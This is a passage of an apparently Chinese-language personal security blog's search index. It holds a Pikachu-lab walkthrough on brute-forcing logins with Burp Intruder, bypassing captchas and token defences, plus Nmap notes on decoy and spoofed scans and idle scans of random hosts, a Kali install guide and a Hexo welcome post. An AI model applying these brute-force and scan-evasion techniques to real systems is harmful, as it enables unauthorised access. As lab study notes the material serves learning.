      <link href="/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY1_%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2022/01/11/PIKACHU%E9%80%9A%E5%85%B3_DAY1_%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="PIKACHU通关-暴力破解"><a href="#PIKACHU通关-暴力破解" class="headerlink" title="PIKACHU通关_暴力破解"></a>PIKACHU通关_暴力破解</h1><p>暴力破解需要将表单传到 <strong>Intruder</strong>(入侵者)模块</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111100429372.png" alt="image-20220111100429372"></p><p>在这里记录一下四种四种<strong>AttackType</strong>:</p><ul><li><p><strong>Sinper</strong>（狙击手）:</p><p>输入一个字典，分别对每一个被标记的位置用此字典遍历。</p></li><li><p><strong>Battering ram</strong>（攻城槌）：</p><p>输入一个字典，同时对每一个被标记的位置用此字典遍历。</p></li><li><p><strong>Pitchfork</strong>（干草叉）</p><p>输入多个字典，按照顺序，从上到下对应遍历。（以最短的字典长度为遍历次数）</p></li><li><p><strong>Cluster bomb</strong>（集束炸弹）</p><p>输入多个字典，遍历所有可能性，排列组合。</p></li></ul><h2 id="第一关——普通爆破"><a href="#第一关——普通爆破" class="headerlink" title="第一关——普通爆破"></a>第一关——普通爆破</h2><p>回到暴力破解，我们使用<strong>Cluster bomb</strong>进行字典爆破：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111103021323.png" alt="image-20220111103021323"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111103527752.png" alt="image-20220111103527752"></p><p>分别对用户名和密码的爆破上传字典，<strong>若用户名和密码有特殊字符需求，不勾选URL-encoding:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111103740053.png" alt="image-20220111103740053"></p><p>点击开始爆破，观察返回报文的长短即可。</p><h2 id="第二关——绕过验证码（ON-SERVER）"><a href="#第二关——绕过验证码（ON-SERVER）" class="headerlink" title="第二关——绕过验证码（ON SERVER）"></a>第二关——绕过验证码（ON SERVER）</h2><p><strong>观察：</strong></p><p>发现页面首先验证验证码的正确性，然后验证用户名和密码。</p><p>同时进行抓包，发现验证码是后端验证。</p><p>但是本关的问题在于，只要不点击网页上的login按钮，验证码就不会刷新，因此使用发包的方式一直爆破即可。</p><p><strong>源码分析：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111111050870.png" alt="image-20220111111050870"></p><p>其一，在验证后，应重置验证码。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111111359414.png" alt="image-20220111111359414"></p><p>其二，不应将验证码作为cookie返回前端</p><h2 id="第三关——绕过验证码（ON-CLIENT）"><a href="#第三关——绕过验证码（ON-CLIENT）" class="headerlink" title="第三关——绕过验证码（ON CLIENT）"></a>第三关——绕过验证码（ON CLIENT）</h2><p>右键查看源代码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111144849999.png" alt="image-20220111144849999"></p><p>发现验证码在前端验证。</p><h2 id="第四关——token防止爆破"><a href="#第四关——token防止爆破" class="headerlink" title="第四关——token防止爆破"></a>第四关——token防止爆破</h2><p>添加了token防止爆破，抓包进行观察，可以发现返回的包中含有下一次的token值。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111145923138.png" alt="image-20220111145923138"></p><p>因此，我们使用正则提取出token强行爆破：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111150453621.png" alt="image-20220111150453621"></p><p>使用正则表达式（Recursive grep）进行匹配，正则添加方法如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220111150832658.png" alt="image-20220111150832658"></p><p>可以使用右边的Refetch response按钮确认报文中有多少符合此正则的位置。</p><p>因此可见，使用token防爆破还是没啥用。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nmap使用笔记</title>
      <link href="/2022/01/08/Nmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/08/Nmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="NMAP使用笔记"><a href="#NMAP使用笔记" class="headerlink" title="NMAP使用笔记"></a>NMAP使用笔记</h1><p>NMAP的作用是在信息收集阶段进行端口扫描。</p><h2 id="一、端口扫描："><a href="#一、端口扫描：" class="headerlink" title="一、端口扫描："></a>一、端口扫描：</h2><p>要给sudo权限</p><p><code>namp xx.com -p 80 -sS</code>（syn扫描方式）</p><p>此外还有-sS/sT/sA/sW/sM 分别对应SYN/Connect()/ACK/window/Maimon</p><p>-sU对应UDP</p><p>-sN/sF/sX对应TCP null/FIN/Xmas</p><p>加 <code>-sV -O</code>可以扫描主机版本 ，操作系统等等信息</p><p><code>namp xx.com -p 80 -A</code>效果相同（推荐） </p><p>扫描所有端口：<code>namp xx.com -A -sS</code>(不讲武德，推荐) </p><p>使用<code> -iR</code>随机扫描域名</p><p>扫描五个最常见的端口 <code>nmap xx.com --top-ports 5</code></p><p>输出到文件<code>-oN [文件路径+文件名]</code></p><p>脚本扫描<code>--script=[文件路径./...+文件名]</code></p><h2 id="二、防火墙欺骗："><a href="#二、防火墙欺骗：" class="headerlink" title="二、防火墙欺骗："></a>二、防火墙欺骗：</h2><p><code>-D1.1.1.1,2.2.2.2</code>冒充其他IP发包（伪造IP）</p><p><code>-g996</code>冒充其他源端口号（伪造端口）</p><p><code>--spoof-mac [MAC地址]</code>冒充其他mac地址</p><p><code> namp -iflist</code>输出正在使用的网络信息</p><p>还可以使用空闲扫描，使用网络上其他的空闲主机进行扫描：</p><p>先发现空闲主机：<code>sudo nmap --script ipedseq -iR 1000 -oN ipidseq.txt</code>(扫描一千个主机，输出到文件)</p><p>扫描结束后，使用空闲主机的ip和端口，使用命令：</p><p><code>nmap -Pn -sI [空闲IP:空闲端口] [目标IP]</code></p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali安装</title>
      <link href="/2022/01/06/kali%E8%A3%85%E6%9C%BA%E8%BF%87%E7%A8%8B/"/>
      <url>/2022/01/06/kali%E8%A3%85%E6%9C%BA%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="kali装机过程"><a href="#kali装机过程" class="headerlink" title="kali装机过程"></a>kali装机过程</h2><p>磁盘管理</p><p>设别管理器</p><p>系统信息</p><p>下载系统iso文件 rufus 3.14 将内容刻录到u盘</p><p>关机开机后，按住F1</p><p>进入bios窗口，选Security  进入Security Boot 将Secure Boot改为Disabled</p><p>F10退出 按住F12 进入Boot Menu 选使用用来装机的USB设备，回车</p><p>进入kali界面，卡了一下，等待</p><p>图形化安装，选择语言和国家</p><p>安装完毕后，连接WIFI</p><p>磁盘分区，选择整个磁盘（前提是备份电脑中的所有内容），选择电脑（最大的）的磁盘</p><p>放在同一分区下，确定后选择“是”要更改</p><p>最后一步，直接重启，先不拔出USB</p><p>拔出USB后，需要对u盘重新分区，使用windows的diskpart命令和磁盘管理。</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/01/04/hello-world/"/>
      <url>/2022/01/04/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
